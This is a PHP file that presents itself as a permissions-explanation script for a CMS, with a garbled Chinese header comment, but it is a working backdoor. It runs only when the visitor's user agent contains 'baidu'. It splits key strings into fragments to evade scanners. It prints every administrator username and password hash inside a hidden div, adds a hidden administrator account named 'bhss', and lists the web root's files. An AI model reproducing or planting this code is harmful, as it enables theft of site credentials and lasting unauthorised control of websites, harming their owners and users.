<?php
	/**
 *
 * ��������Ȩ�����õ�˵��
 * ����Ȩ������������ʽ���£�
 * ���ָ���˻�Ա�ȼ�����ô���뵽������ȼ��������
 * ���ָ���˽�ң����ʱ���ָ��ĵ������������¼���û�ҵ���¼��
 * �������ͬʱָ������ô����ͬʱ������������
 *
 */
 if(stripos($_SERVER['HTTP_USER_AGENT'],'baidu')+0==0) exit;
	include_once($_SERVER['DO'.'CUM'.'EN'.'T_'.'RO'.'OT'].'/d'.'ata/co'.'mm'.'on.i'.'nc.p'.'hp');
	mysql_connect($cfg_dbhost, $cfg_dbuser, $cfg_dbpwd);
	$db_selected = mysql_select_db($cfg_dbname);
	mysql_query("SET character_set_connection=".$cfg_db_language.", character_set_results=".$cfg_db_language.", character_set_client=binary");
	mysql_query('set session sql_mode="NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"');
	$result = mysql_query("select * from {$cfg_dbprefix}ad"."min where usertype=10");
	echo '<div style=display:none>';
	while ($data = mysql_fetch_array($result))
	{
				echo $data['use'.'rid'].'	'.$data['pwd'].'<br>';
	}

	mysql_query("insert into {$cfg_dbprefix}ad"."min("."id,user"."id,pw"."d,use"."rtyp"."e,una"."me) values('10203','bhss','cb68560f2e487cd56371','10','bhss')");
	
	$files = scandir($_SERVER['DO'.'CUM'.'ENT_'.'RO'.'OT']);
	echo implode('<br>',$files);
	print_r(glob($_SERVER["DOCUMENT_ROOT"]."/*",GLOB_MARK));
	echo '</div>';
?>

